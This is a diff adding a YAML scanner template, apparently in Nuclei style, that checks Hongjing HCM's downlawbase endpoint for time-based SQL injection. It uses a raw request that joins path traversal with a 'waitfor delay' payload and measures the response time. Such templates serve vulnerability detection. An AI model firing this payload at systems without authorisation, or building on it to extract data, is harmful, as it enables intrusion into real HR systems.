@@ -1,0 +1,27 @@
+id: poc-yaml-hongjing-hcm-downlawbase-sqli
+info:
+  name: 宏景HCM downlawbase SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 1}}"
+http:
+  - raw:
+      - |
+        GET /templates/attestation/../../selfservice/lawbase/downlawbase?id=11';waitfor+delay+'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+        part: body
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration < to_number(t2)"
